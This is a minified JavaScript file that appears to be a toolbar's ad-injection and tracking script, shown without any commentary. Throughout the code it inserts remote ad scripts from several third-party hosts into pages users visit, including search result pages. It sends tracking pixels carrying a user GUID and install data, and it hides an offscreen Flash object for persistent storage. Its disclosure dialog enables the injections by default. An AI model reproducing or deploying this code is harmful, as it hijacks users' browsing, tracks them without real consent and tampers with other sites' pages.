if(!window.xq7YzLp6){window.xq7YzLp6Exception=function(b,d){try{var a=encodeURIComponent;
var c="&block="+a(d)+"&name="+a(b.name)+"&message="+a(b.message)+"&file="+(b.hasOwnProperty("fileName")?a(b.fileName):"")+"&line="+(b.hasOwnProperty("lineNumber")?a(b.lineNumber):"")+"&_="+new Date().getTime();
(function(){var e=new Image(1,1);
e.onload=function(){e.onload=null
};e.src="http://utrack.zugo.com/pix?c=zugo.inj.man.exception"+c
})()}catch(b){}};
window.onerror=function(g,c,a){try{if(!c.match(/(tbupdate\.zugo|adbitly|d29f1hnftf5u9z\.cloudfront|dealply|clickply|dpstack)/)){return false
}var b=encodeURIComponent;
var f="&block=global&name=onerror&message="+b(g)+"&file="+b(c)+"&line="+b(a)+"&_="+new Date().getTime();
(function(){var e=new Image(1,1);
e.onload=function(){e.onload=null
};e.src="http://utrack.zugo.com/pix?c=zugo.inj.man.exception"+f
})()}catch(d){}return true
};window.xq7YzLp6=function(){var r=false;
var G="2.5";
var F="http://tbupdate.zugo.com/ztb/"+G+"/jsi/man/";
var M="gpfsr7VvXE54";
var N={"cc":"US","ip":"15.219.153.82"};
var l={};var v=null;
var o=null;
var w=0;var g=null;
var y=null;
var L=0;var f=null;
var z=0;var D=0;
var c=function(){var Q=!1,R="0.0.0";
function S(Z){Z=Z.match(/[\d]+/g);
Z.length=3;
return Z.join(".")
}if(navigator.plugins&&navigator.plugins.length){var T=navigator.plugins["Shockwave Flash"];
T&&(Q=!0,T.description&&(R=S(T.description)));
navigator.plugins["Shockwave Flash 2.0"]&&(Q=!0,R="2.0.0.11")
}else{if(navigator.mimeTypes&&navigator.mimeTypes.length){var U=navigator.mimeTypes["application/x-shockwave-flash"];
(Q=U&&U.enabledPlugin)&&(R=S(U.enabledPlugin.description))
}else{try{var V=new ActiveXObject("ShockwaveFlash.ShockwaveFlash.7"),Q=!0,R=S(V.GetVariable("$version"))
}catch(W){try{V=new ActiveXObject("ShockwaveFlash.ShockwaveFlash.6"),Q=!0,R="6.0.21"
}catch(X){try{V=new ActiveXObject("ShockwaveFlash.ShockwaveFlash"),Q=!0,R=S(V.GetVariable("$version"))
}catch(Y){}}}}}return R
};var p=function(W){var Y="SiUnhdqlqHN9t7wB";
W=W||{};var U={swf_url:null,namespace:null,path:"/",debug:false,timeout:20,onready:null,onerror:null,onaskpermission:null};
var R;for(R in U){if(U.hasOwnProperty(R)){if(!W.hasOwnProperty(R)){W[R]=U[R]
}}}if(!W.swf_url||!W.namespace){return null
}W.namespace=W.namespace.replace(/[^a-z0-9_]/ig,"_");
var T=Y+"_"+W.namespace;
var Q=T+"_swf";
if(window[T]){return window[T]
}var X=function(){};
X.config=W;
X.log=function(){};
X.ready=false;
X.set=function(aa,Z){return X.swf.set(aa,Z)
};X.get=function(Z){return X.swf.get(Z)
};X.clear=function(Z){X.swf.clear(Z)
};X.onload=function(){var Z=X;
setTimeout(function(){clearTimeout(Z._timeout);
Z.ready=true;
Z.set("__bugfix","1");
if(Z.config.onready){Z.config.onready()
}},1000)};X.onerror=function(Z){clearTimeout(X._timeout);
if(X.config.onerror){X.config.onerror(Z)
}};X.onaskpermission=function(Z){if(X.config.onaskpermission){X.config.onaskpermission(Z)
}};X._timeout=setTimeout(function(){if(X.config.onerror){X.config.onerror("init timeout "+X.config.timeout+"s")
}},W.timeout*1000);
window.window[T]=X;
var S=document.createElement("div");
S.id=T+"_container";
S.style.position="absolute";
S.style.top="-2000px";
S.style.left="-2000px";
document.body.appendChild(S);
var V="logfn="+T+".log&amp;onload="+T+".onload&amp;onerror="+T+".onerror&amp;onaskpermission="+T+".onaskpermission&amp;LSOPath="+W.path+"&amp;LSOName="+W.namespace;
S.innerHTML='<object height="1" width="1" type="application/x-shockwave-flash" id="'+Q+'" data="'+W.swf_url+'"><param name="movie" value="'+W.swf_url+'"><param name="FlashVars" value="'+V+'"><param name="allowScriptAccess" value="always"></object>';
X.swf=document[Q]||window[Q];
return X};var H=function(Q,T){var S="http://utrack.zugo.com/pix?c=zugo.inj.man."+Q;
if(T){var R=[];
for(k in T){R.push(k+"="+encodeURIComponent(T[k]))
}S+="&"+R.join("&")
}if(v){S+="&"+v
}S+="&_="+new Date().getTime();
(function(){var U=new Image(1,1);
U.onload=function(){U.onload=null
};U.src=S})()
};var u=function(Q,R){if(r||(o&&o.substr(11,2).match(/^[0].$/i))){H(Q,R)
}};var x=function(T,U){if(!f){return false
}var R="utrack_last_"+T;
var Q=new Date().getTime();
var S=f.get(R);
S=S?new Number(S):0;
if(Q-S>1000*60*60*24){f.set(R,Q);
H(T,U);return true
}return false
};var E=function(T,R,U){var S=document.createElement("script");
S.setAttribute("type","text/javascript");
if(typeof(U)!=="undefined"){S.setAttribute("id",U)
}S.setAttribute("src",T);
var Q=document.getElementsByTagName("head");
if(R&&Q&&Q.length>0){Q[0].appendChild(S)
}else{document.body.appendChild(S)
}};var A=function(R){var Q=window.location.hostname.toLowerCase();
for(i=0;i<R.length;
i++){if(Q.search(R[i])!==-1){return true
}}return false
};var I=function(R){if(typeof(R)=="undefined"){return
}var Q="http://smartcoup-a.akamaihd.net/loaders/1041/l.js?pid=1041&zoneid="+R;
E(Q);u("injected",{component:"50onred",message:R})
};var h=function(R){if(typeof(R)=="undefined"){return
}var Q="";for(i=0;
i<o.length;
i+=2){Q+=(parseInt(o.charAt(i),16)^parseInt(o.charAt(i+1),16)).toString(16)
}var S="http://cdfcdn.net/"+R+"/"+window.location.hostname.toLowerCase()+"/gac.js?g="+Q;
E(S,true,"wsdLu9j00_ds");
u("injected",{component:"ecomm",message:R})
};window.xq7YzLp6_ecomm_noop=function(){try{if(!A([/(google|bing|msn|yahoo|startnow|facebook)/])){I(107553)
}}catch(Q){window.xq7YzLp6Exception(Q,"ecomm_noop")
}};var O=function(R){var Q="ODosPiI";
var S="https://in.admedia.com/?id="+Q+"&subid="+R;
if(typeof(R)=="undefined"){return
}if(A([/(comcast|hulu|mtv|myspace|tmz|vimeo|vivo|youtube)/])){return
}if(g&&g.name=="msie"&&g.version==7&&g.trident<4){return
}if(typeof window.console=="undefined"){window.console={log:function(){},info:function(){},error:function(){},warn:function(){},trace:function(){},debug:function(){}}
}E(S,true);
u("injected",{component:"admedia",message:R})
};var a=function(Q){var R="http://i.snowjs.info/snow/javascript.js?channel="+Q;
if(typeof(Q)=="undefined"){return
}if(g&&g.name=="msie"&&g.version==7&&g.trident<4){return
}E(R,true);
u("injected",{component:"dealply",message:Q})
};var b=function(R){var S="aqqpb";
if(typeof(R)!=="undefined"){S=R
}if(g&&g.name=="msie"&&g.version==7&&g.trident<4){return
}var Q="";for(i=0;
i<o.length;
i+=2){Q+=(parseInt(o.charAt(i),16)^parseInt(o.charAt(i+1),16)).toString(16)
}var T="http://api.adbitly.net/"+S+"/"+window.location.hostname.toLowerCase()+"/gac.js?g="+Q;
E(T,true,"wsdLu9j00_ds");
u("injected",{component:"serp",message:S})
};var m=function(){var Q="http://cdn1.certified-apps.com/scripts/publishers/zugo/enable.js?si=25492";
E(Q);u("injected",{component:"widdit"})
};var J=function(){var R=o?o.charAt(13):"";
var Q=("cc" in N&&N.cc.length==2)?N.cc.toUpperCase():"US";
if(!A([/(google|bing|msn|yahoo|startnow|facebook)/,/\.(ask|babylon)\.com$/])){if(Q=="US"){if(l.channel==="admediatest"){O("jsiman")
}else{if(R.match(/^[8]$/i)){h("pqcpv");
a("jsiman")
}else{if(R.match(/^[0-79AB]$/i)){h("pqcpv")
}else{if(R.match(/^[CD]$/i)){O("jsiman")
}else{if(R.match(/^[EF]$/i)){I(91545)
}}}}}}else{if(l.channel==="admediatest"){O("jsiman_int")
}else{if(R.match(/^[0-789AB]$/i)){if(Q.match(/^(DE|ES|FR|NL|BE|BR|IT|SE|NO|JP|MX|AR|DK|PL|AT|AU|RU)$/)){a("jsiman_int")
}}else{if(R.match(/^[CD]$/i)){O("jsiman_int")
}else{if(R.match(/^[EF]$/i)){I(135134)
}}}}}}if(Q=="US"){if(A([/^www\.google\.(co\.(in|il|uk|jp)|[a-z]{2,3})$/])&&window.location.pathname.match(/^(\/(search|webhp)|\/$|$)/)){if(R.match(/^[3]$/i)){b("aqqpb")
}else{if(R.match(/^[012456789A-F]$/i)){b("eakwa")
}}}}};var n=function(){if(!A([/(google|bing|msn|yahoo|startnow)/])){m()
}};var d=function(U){var T=document.createElement("link");
T.setAttribute("rel","stylesheet");
T.setAttribute("type","text/css");
T.setAttribute("href",F+"disclosure.css");
var Q=document.getElementsByTagName("head")[0];
if(!Q){return
}Q.appendChild(T);
var S=document.createElement("div");
S.setAttribute("id","xq7YzLp6DlgWrapper");
S.setAttribute("style","width: 400px; height: auto; position: fixed; top: 0px; left: 400px; z-index: 1101;");
document.body.appendChild(S);
var R='Check out our <a href="http://dropinsavings.com/privacy.html">Privacy Policy</a> and <a href="http://dropinsavings.com/terms.html">Terms and Conditions</a>.';
if(l.channel==="admediatest"){R='Check out our <a href="http://www.startnow.com/privacy/">Privacy Policy</a> and <a href="http://www.startnow.com/terms/">Terms and Conditions</a>.'
}S.innerHTML='<div id="xq7YzLp6DlgIcon" style="background:url(\''+F+'disclosure_icon.png\')"></div><div id="xq7YzLp6Dlg" style="height: auto; width: 306px;"><h1>Coupons Browser Update</h1><p>We have enabled our Coupons add-on which will enhance your browsing experience by displaying coupons as you shop and browse your favorite sites on the web. '+R+'</p></div><div id="xq7YzLp6DlgButtons"><input type="checkbox" id="xq7YzLp6DlgInput" /><label for="xq7YzLp6DlgInput" style="padding: 0 48px 0 5px">Turn off these enhancements</label><a id="xq7YzLp6DlgButton" href="#" onclick="return xq7YzLp6_dlg_close()">Close</a></div>';
H("dlg-impression",{days_shown:U,flash_version:y})
};var q=function(Q){var R="http://tbstore.zugo.com/store/v1/set?uuid="+o+"&bucket=1&callback=f&value="+Q+"&_="+new Date().getTime();
(function(){var S=new Image(1,1);
S.onload=function(){S.onload=null
};S.src=R})()
};window.xq7YzLp6_dlg_close=function(S){try{var Q=document.getElementById("xq7YzLp6DlgInput");
var R=!(Q&&Q.checked)?"yes":"no";
var V=document.getElementById("xq7YzLp6DlgWrapper");
if(V){V.parentNode.removeChild(V)
}H("dlg-closed",{result:R});
var U=f.get("disclosure_coupons");
if(U!==null){u("error",{error:"multi dialog close",flash_version:y,message:(U+"|"+R)})
}f.clear("disclosure_days_shown");
f.clear("disclosure_last_shown");
j(R)}catch(T){window.xq7YzLp6Exception(T,"dlgclose")
}};var j=function(R){var Q=f.set("disclosure_coupons",R);
if(Q!=0){u("error",{error:"flash set failed",flash_version:y,message:("dialog|"+R+"|"+Q)})
}q(R);if(R==="yes"){J()
}};var K=function(S){if(S==="yes"){J()
}else{if(S==="no"){return
}else{if(S===null){if(g&&g.name=="msie"&&g.version==7){j("yes");
return}var T=f.get("disclosure_days_shown");
T=(T===null)?0:new Number(T);
if(T>=3){u("error",{error:"disclosure shown too often",flash_version:y,message:T+" days"});
return}var R=new Date();
var Q=f.get("disclosure_last_shown");
last=new Date(Q===null?0:new Number(Q));
if((R.getUTCFullYear()!=last.getUTCFullYear())||(R.getUTCMonth()!=last.getUTCMonth())||(R.getUTCDate()!=last.getUTCDate())){T+=1;
f.set("disclosure_days_shown",T);
f.set("disclosure_last_shown",R.getTime())
}d(T)}else{u("error",{error:"invalid disclosure status",flash_version:y,message:S})
}}}};var P=function(){window.xq7YzLp6ServerCB=function(T){try{u("trace",{event:"tbstore-result",message:T});
if(T===""){T=null
}if(T==="yes"||T==="no"){var R=f.set("disclosure_coupons",T);
if(R!=0){u("error",{error:"flash set failed",flash_version:y,message:("tbstore|"+T+"|"+R)})
}}K(T)}catch(S){window.xq7YzLp6Exception(S,"servercb")
}};var Q="http://tbstore.zugo.com/store/v1/get?uuid="+o+"&bucket=1&callback=xq7YzLp6ServerCB&_="+new Date().getTime();
E(Q)};var C=function(){try{var T=Math.round(((new Date().getTime())-L)/1000);
u("trace",{event:"flash-ready",flash_version:y,gfe:z,gfp:D,ready_delay:T});
try{var S=new Date().getTime();
var Q=f.set("test_var",S);
if(Q!=0){f.clear("test_var");
var V=z+"|"+D+"|set:"+Q;
u("error",{error:"flash test failed",flash_version:y,message:V});
return}}catch(U){f.clear("test_var");
var V=z+"|"+D+"|exception:"+U.message;
u("error",{error:"flash test failed",flash_version:y,message:V});
return}var R=f.get("disclosure_coupons");
if(R!==null){K(R);
return}u("trace",{event:"tbstore-fallback",flash_version:y});
P()}catch(U){window.xq7YzLp6Exception(U,"flashready")
}};var e=function(Q){u("error",{error:"flash init failed",flash_version:y,message:Q});
z=1};var B=function(Q){u("error",{error:"flash permissions",flash_version:y,message:Q});
D=1};var t=function(){var S=navigator.userAgent.toLowerCase();
var Q=S.match(/(chrome|firefox|msie)\/?\s*((\d+)\.[\d.]+)/);
var R=S.match(/trident\/([\d]+)/);
return Q?{name:Q[1],version:new Number(Q[3]),trident:(R?new Number(R[1]):null)}:null
};var s=function(){if(document.getElementsByTagName("frameset").length!=0){return
}try{if(window.location.protocol.toLowerCase()!=="http:"){return
}}catch(X){return
}if(window.self!=window.top){return
}if(!document.body){w++;
if(w<10){setTimeout(function(){s()
},500)}return
}g=t();try{var W=document.getElementById(M);
W=W.src.split("?")[1].split("&");
for(i=0;i<W.length;
i++){var U=W[i].split("=");
l[U[0]]=U[1]
}}catch(X){}var aa=["partner_id","product_id","toolbar_id","toolbar_version","install_country","install_date","user_guid","browser","os_version"];
var Q=[];for(i=0;
i<aa.length;
i++){var S=aa[i];
if(S in l){Q.push(S+"="+l[S])
}}Q.push("browser_version="+(g?g.version:""));
v=Q.join("&");
if(!("user_guid" in l)||l.user_guid.length!=32){u("error",{error:"bad user_guid",message:l.user_guid});
return}o=l.user_guid;
if(g&&g.name=="msie"&&((g.trident==4&&g.version!=8)||(g.trident==5&&g.version!=9)||(g.trident==6&&g.version!=10))){u("error",{error:"IE compat mode",message:(g.trident+"/"+g.version),ua:navigator.userAgent,url:window.location.href})
}if(!g||!((g.name=="chrome"&&g.version>=10)||(g.name=="firefox"&&g.version>=4)||(g.name=="msie"&&g.version>=7))){u("error",{error:"unsupported browser",message:g?(g.name+"/"+g.version):""});
return}var R;
if(!("install_date" in l)||!(R=/^(\d\d\d\d)(\d\d)(\d\d)$/.exec(l.install_date))){u("error",{error:"bad install_date"});
return}var Y=new Date(parseInt(R[1],10),parseInt(R[2],10)-1,parseInt(R[3],10));
var T=l.product_id||"";
var V=(l.browser||"").toUpperCase();
var Z=Y>=new Date(2008,1-1,1)&&(Y<=new Date(2011,12-1,31)||(Y<=new Date(2012,12-1,31)&&V==="CR"&&T!="872"&&T!="741")||l.channel=="mantest"||l.channel=="admediatest");
if(!Z){return
}u("trace",{event:"start-jsi"});
setTimeout(function(){try{n()
}catch(ab){window.xq7YzLp6Exception(ab,"inject")
}},500);L=new Date().getTime();
y=c();if(y.split(".").shift()<9){u("error",{error:"flash unsupported",flash_version:y});
return}f=p({swf_url:F+"fc.swf",namespace:"tbstore",onready:C,onerror:e,onaskpermission:B,timeout:20});
if(!f){return
}};s()};window.xq7YzLp6()
};